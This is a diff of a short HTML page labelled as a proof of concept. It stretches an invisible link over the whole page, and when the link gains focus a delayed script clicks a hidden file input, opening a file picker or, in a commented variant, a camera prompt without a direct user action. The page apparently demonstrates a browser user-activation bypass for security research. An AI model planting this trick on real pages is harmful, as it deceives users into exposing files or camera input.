@@ -1,10 +1,45 @@
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<body>
+<style>
+    h1 {
+        margin: 1em;
+    }
+
+    a {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+    }
+
+    input {
+        display: none;
+    }
+
+    img {
+        width: 100%;
+    }
+</style>
+
+
+<!-- [poc-with-system-dialog]: -->
+<input id="fileSelect" type="file" accept="image/*" />
+
+<!-- [poc-with-camera]: -->
+<!-- <input id="fileSelect" type="file" accept="*/*" /> -->
+
+<img id="img">
+<center><a id="link" href="https://www.google.com" target="_blank">Click Here</a></center>
+
 <script>
-parent_frame = document.body.appendChild(document.createElement("iframe"));
-child_frame = document.createElement("iframe");
-child_frame.name = "trigger";
-parent_frame.contentDocument.body.appendChild(child_frame);
-parent_frame.src="portal.html"
+    link.onfocus = () => {	
+
+        setTimeout(function(){fileSelect.click();}, 2500);
+
+    }
+
+    fileSelect.onchange = (event) => {
+        img.src = URL.createObjectURL(fileSelect.files[0]);
+    }
 </script>
-</body>
